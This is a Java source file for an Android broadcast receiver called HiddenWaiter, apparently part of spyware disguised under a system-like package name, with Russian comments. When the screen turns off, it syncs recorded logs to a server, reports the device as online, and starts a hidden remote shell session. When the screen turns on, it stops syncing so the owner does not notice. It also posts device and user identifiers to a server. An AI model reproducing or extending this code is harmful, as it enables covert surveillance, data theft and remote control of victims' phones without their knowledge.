package oom.android.system.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;

import java.net.HttpURLConnection;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;

import javax.net.ssl.HttpsURLConnection;

public class HiddenWaiter extends BroadcastReceiver {
    Context context;

    static long lastsynctime=0;//последнее время синхронизации
    static long lastonlinetime=0;//последнее время онлайна
    static long sync_interval=10800000; // попытка синхронизации каждые 3 часа
    static long online_knock_interval=400;
    static Thread shellthread=null;  // поток шелл-сессии
    static Thread syncthread=null; // поток синхронизации
    static long lastsenddata =3600000;



    @Override
    public void onReceive(Context context, Intent intent) {
        this.context=context;
        String action = intent.getAction();
        switch (action){
            //android.intent.action.SCREEN_OFF android.intent.action.TIME_SET
            case "android.intent.action.SCREEN_OFF":
                MyService.ScreenOn = false;
                if(isNetworkAvailable()){
                        if(System.currentTimeMillis()-lastsynctime>sync_interval){ //
                            if(!MyService.recording&&!MyService.syncactive){
                                sync();
                            }
                        }
                        if(System.currentTimeMillis()-lastonlinetime>online_knock_interval){
                            notifyonline();
                        }
                        if(!MyService.cmdsessionactive){
                            Log.d("My","Start");
                            shellthread = new Thread(new ShellSession());  //
                            shellthread.setName("shellthread");
                            shellthread.start();
                        }
                    }else{
                        try {
                            Thread.currentThread().sleep(lastsenddata);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                }
                break;
            case "android.intent.action.SCREEN_ON"://При включении экрана происходит проверка на потоки и включение режима screen on
                if(syncthread!=null&&syncthread.isAlive()){
                    try{
                        MyService.ScreenOn = true;
                        syncthread.interrupt();
                    } catch(Exception e){}
                }
                break;
        }
    }
    //проверка наличия сети
    boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager)
                context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    //сообщение серверу о подключении
    void notifyonline() {
        lastonlinetime =System.currentTimeMillis() / 1000L;   // timestamp   3
        Thread t = new Thread(new HttpPoster(MyService.online_url,Long.toString(lastonlinetime)));
        t.start();
    }
    //Запуск потока синхронизации
    void sync(){

        syncthread = new Thread(new SyncThread(MyService.log_path,context,true,true));
        //change to ..false,true) to enable encryption
        syncthread.setName("syncthread");
        syncthread.start();
    }

    private int sendPost(String url_string){
        Date currentDate = new Date();
        DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss-dd.MM.yyyy", Locale.getDefault());
        String dateText = dateFormat.format(currentDate);
        try{
            String url = url_string;


            HttpURLConnection httpClient = (HttpURLConnection) new URL(url).openConnection();

            //add reuqest header
            httpClient.setRequestMethod("POST");

            String urlParameters = "deviceid="+MyService.DeviceID()+"&admin="+MyService.admin+"&android="+android.os.Build.VERSION.SDK_INT+"&userid="+MyService.userid+"&time="+dateText+"&appV="+MyService.App_Version;

            // Send post request
            httpClient.setDoOutput(true);
            try (DataOutputStream wr = new DataOutputStream(httpClient.getOutputStream())) {
                wr.writeBytes(urlParameters);
                wr.flush();
            }

            int responseCode = httpClient.getResponseCode();


            try (BufferedReader in = new BufferedReader(
                    new InputStreamReader(httpClient.getInputStream()))) {

                String line;
                StringBuilder response = new StringBuilder();

                while ((line = in.readLine()) != null) {
                    response.append(line);
                }

            }
            return responseCode;
        }catch (Exception e){
        }

        return 0;
    }
}
